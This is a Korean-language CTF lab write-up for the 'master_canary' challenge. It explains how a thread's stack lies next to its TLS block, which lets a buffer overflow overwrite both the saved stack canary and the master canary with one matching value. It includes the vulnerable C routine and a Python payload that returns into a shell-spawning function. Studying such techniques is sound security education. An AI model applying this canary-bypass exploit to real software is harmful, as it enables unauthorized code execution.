# master_canary (mc_thread)

스레드 환경에서 **마스터 카나리(master canary)** 를 덮어써 스택 카나리 검사를 우회한다.

## 대상 코드

```c
void thread_routine() {
  char buf[256];
  int size = 0;
  scanf("%d", &size);
  read_bytes(buf, size);      // size 검증 없이 8바이트씩 size번 읽음 → 대형 BOF
}
int main() {
  pthread_t thread_t;
  pthread_create(&thread_t, NULL, (void *)thread_routine, NULL);
  pthread_join(thread_t, 0);
}
```

- 컴파일: `gcc ... -pthread -no-pie` → 카나리 있음, PIE 없음.
- `read_bytes`는 입력 `size`만큼 8바이트 단위로 무제한 읽어 스택을 크게 덮을 수 있다.

## 카나리와 마스터 카나리

- 함수 프롤로그에서 카나리는 `fs:0x28`(TLS)에서 읽어와 스택에 저장되고, 에필로그에서 다시 `fs:0x28`과 비교한다.
- 이 **원본 값(master canary)** 은 TLS의 `tcbhead_t.stack_guard`에 있다.
- **메인 스레드**에서는 TLS가 스택에서 멀리 떨어져 있어 BOF로 닿기 어렵다.
- 하지만 **`pthread_create`로 만든 스레드**는 스택과 TLS(TCB)가 같은 `mmap` 영역에 붙어 있다. 즉 스레드 스택 오버플로우로 **마스터 카나리 자체에 도달**할 수 있다.

## 익스플로잇 원리

스택에 저장된 카나리와 TLS의 마스터 카나리를 **같은 값**으로 동시에 덮으면, 에필로그의 `스택 카나리 == fs:0x28` 검사를 통과한다. 값은 무엇이든(예: `0x41...`) 두 곳만 일치하면 된다.

```python
payload  = b'A' * 264            # buf ~ 스택 카나리 직전까지
payload += b'A' * 8              # 스택에 저장된 카나리
payload += b'B' * 8              # SFP
payload += p64(giveshell)        # RET → execve("/bin/sh")
payload += b'C' * (0x910 - len(payload))
payload += p64(0x404800 - 0x972) # self 포인터 보정: 카나리 검사 전 SIGSEGV 방지
payload += b'C' * 0x10
payload += p64(0x4141414141414141) # 마스터 카나리(TLS) — 스택 카나리와 동일 값
```

- `giveshell()`은 `execve("/bin/sh", 0, 0)`을 실행하는 편의 함수.
- 중간의 `self` 포인터 보정은 `pthread` 종료 루틴에서 TCB 필드를 참조하다 크래시 나는 것을 막기 위한 것.

## 핵심 개념

- **스레드 스택 = TLS 인접**: 스레드 환경에서만 성립하는 마스터 카나리 우회의 핵심 전제.
- 카나리 값을 릭하지 않고도, 저장본과 원본을 **동일한 임의 값**으로 덮어 검사를 통과.
- 함께 있는 [`test/master_canary.c`](./test/master_canary.c)는 `no-pie`·단일 스레드의 최소 예제로, 카나리 위치/동작을 관찰하는 실습용이다.
